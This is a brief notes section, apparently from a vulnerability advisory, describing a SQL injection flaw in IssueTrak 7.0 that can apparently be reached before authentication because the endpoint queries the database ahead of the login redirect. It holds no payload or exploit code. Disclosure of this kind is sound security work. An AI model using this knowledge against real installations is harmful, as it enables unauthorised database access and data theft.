Notes
=====
- A SQL injection vulnerability has been identified in IssueTrak 7.0 which, if successfully exploited, could allow an attacker to access sensitive information in the database.
- Authentication is generally required in order to hit this endpoint. If a non SQL injection request is made the reuslt is a redirect to the login page. However, it seems that on the back end, this request touches the database even without authentication, making it exploitable from a pre-authentication vantage point.
- IssueTrak 7.0 was released in 2006
